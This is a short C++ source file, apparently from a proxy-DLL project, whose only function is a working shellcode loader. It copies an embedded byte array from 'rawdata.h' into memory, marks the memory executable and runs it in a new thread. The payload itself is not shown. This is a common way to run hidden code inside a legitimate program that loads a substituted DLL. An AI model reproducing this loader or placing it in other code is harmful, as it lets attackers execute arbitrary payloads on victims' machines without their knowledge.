// proxydll.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "rawdata.h"

void RunIt() {
	HANDLE hProcess = GetCurrentProcess();
	SIZE_T BytesWritten = 0;
	DWORD lpflOldProtect = 0;
	DWORD* lpThreadId = 0;
	LPVOID arg = VirtualAlloc(0, sizeof(rawData), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	WriteProcessMemory(hProcess, arg, &rawData, sizeof(rawData), &BytesWritten);
	VirtualProtect(arg, sizeof(rawData), PAGE_EXECUTE_READ, &lpflOldProtect);
	HANDLE threadID = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)arg, NULL, 0, NULL);
	WaitForSingleObject(threadID, 1000);
}


